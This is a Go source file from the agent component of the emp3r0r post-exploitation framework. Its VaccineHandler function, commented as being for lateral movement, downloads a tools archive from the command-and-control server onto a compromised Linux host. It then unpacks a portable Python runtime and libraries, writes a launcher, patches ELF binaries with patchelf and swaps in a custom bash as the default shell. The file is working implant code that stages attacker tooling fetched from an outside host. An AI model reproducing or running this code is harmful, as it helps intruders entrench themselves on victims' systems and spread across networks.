//go:build linux
// +build linux

package agent

/*
install tools to RuntimeConfig.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"
	"runtime"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func VaccineHandler() (out string) {
	if runtime.GOOS != "linux" {
		return "Only supported in Linux"
	}

	const UtilsArchive = "utils.tar.xz"

	var (
		PythonArchive = RuntimeConfig.UtilsPath + "/python3.tar.xz"
		PythonLib     = RuntimeConfig.UtilsPath + "/python3.11"
		PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")

		// run python scripts with this command
		// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
		PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
			"LD_LIBRARY_PATH=%s/lib %s ",
			PythonPath, PythonLib,
			RuntimeConfig.UtilsPath, RuntimeConfig.UtilsPath+"/python3")

		// run python itself with this script
		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
	)

	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/"+UtilsArchive)
	_, err := DownloadViaCC(UtilsArchive, RuntimeConfig.AgentRoot+"/"+UtilsArchive)
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}
	defer os.Remove(RuntimeConfig.AgentRoot + "/" + UtilsArchive)

	// unpack utils.tar.xz to our PATH
	extractPath := RuntimeConfig.UtilsPath
	if err = util.Unarchive(RuntimeConfig.AgentRoot+"/"+UtilsArchive, extractPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	log.Printf("%s extracted", UtilsArchive)

	// libs
	if err = util.Unarchive(RuntimeConfig.UtilsPath+"/libs.tar.xz",
		RuntimeConfig.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		out = fmt.Sprintf("Unarchive libs: %v", err)
		return
	}
	log.Println("Libs configured")
	defer os.Remove(RuntimeConfig.UtilsPath + "/libs.tar.xz")

	// extract python3.9.tar.xz
	log.Printf("Pre-set Python environment: %s, %s, %s", PythonArchive, PythonLib, PythonPath)
	os.RemoveAll(PythonLib)
	log.Printf("Found python archive at %s, trying to configure", PythonArchive)
	defer os.Remove(PythonArchive)
	if err = util.Unarchive(PythonArchive, RuntimeConfig.UtilsPath); err != nil {
		out = fmt.Sprintf("Unarchive python libs: %v", err)
		log.Print(out)
		return
	}

	// create launchers
	err = os.WriteFile(RuntimeConfig.UtilsPath+"/python", []byte(PythonLauncher), 0o755)
	if err != nil {
		out = fmt.Sprintf("Write python launcher: %v", err)
	}
	log.Println("Python configured")

	// fix ELFs
	files, err := os.ReadDir(RuntimeConfig.UtilsPath)
	if err != nil {
		return fmt.Sprintf("Fix ELFs: %v", err)
	}
	for _, f := range files {
		fpath := fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, f.Name())
		if !IsELF(fpath) || IsStaticELF(fpath) {
			continue
		}
		// patch patchelf itself
		old_path := fpath // save original path
		if f.Name() == "patchelf" {
			new_path := fmt.Sprintf("%s/%s.tmp", RuntimeConfig.UtilsPath, f.Name())
			err = util.Copy(fpath, new_path)
			if err != nil {
				continue
			}
			fpath = new_path
		}

		err = FixELF(fpath)
		if err != nil {
			out = fmt.Sprintf("%s, %s: %v", out, fpath, err)
		}

		// remove tmp file
		if f.Name() == "patchelf" {
			err = os.Rename(fpath, old_path)
			if err != nil {
				out = fmt.Sprintf("%s, %s: %v", out, fpath, err)
			}
		}
	}

	log.Println("ELFs configured")

	// set DefaultShell
	custom_bash := fmt.Sprintf("%s/bash", RuntimeConfig.UtilsPath)
	if util.IsFileExist(custom_bash) {
		emp3r0r_data.DefaultShell = custom_bash
	}

	return
}
